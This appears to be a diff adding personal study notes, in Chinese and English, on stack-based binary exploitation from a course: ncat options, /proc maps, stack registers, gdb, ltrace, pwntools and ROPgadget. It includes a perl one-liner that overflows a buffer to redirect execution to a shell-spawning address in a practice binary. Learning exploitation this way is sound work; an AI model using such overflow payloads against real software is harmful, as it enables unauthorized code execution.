@@ -1,0 +1,44 @@
+ncat -v 列出debug訊息 -c 執行的程式 -k keep 重複開啟server -l listen on certain port
+
+利用cat查看 where is the buffer? 24:53
+cat /proc/$pid/maps
+ex. cat /proc/874/maps
+or cat /proc/‘pidof tets’/maps
+注意 global variable位置不會變
+
+$esp指向stack的頂端 push之後 會減少4 (往下長)
+$ebp指向frame的頂端 利用將rsp減少 rbp到rsp之間的距離變成這個frame的區域變數
+
+rsp是64位元 esp是rsp低32位元 sp是esp低16位元
+
+Perl -e one line program
+
+Python -c one line program
+
+ex
+0x0000000000400617
+perl -e 'print "A"x24,"\x17\x06\x40\x00\x00\x00\x00\x00"' | ./k
+
+gets 記得接\n
+
+ltrace to show how program run (決定system(“sh”) 到底有沒有run)
+perl -e 'print "A"x24,"\x17\x06\x40\x00\x00\x00\x00\x00"' | ltrace ./k
+
+
+
+(cat input.txt;cat) | k 
+To keep the pip input stream
+
+
+pwntools
+
+from pwn import *
+r = remote
+然後gdb可以attach到執行中的程式
+attach $pid
+
+strace 可以看有哪些system call day1 2:22:51
+
+ROPgadget --binary ./re > gadgets
+
+利用xor or push 去解決 gets遇到換行或是strcpy遇到\0的問題
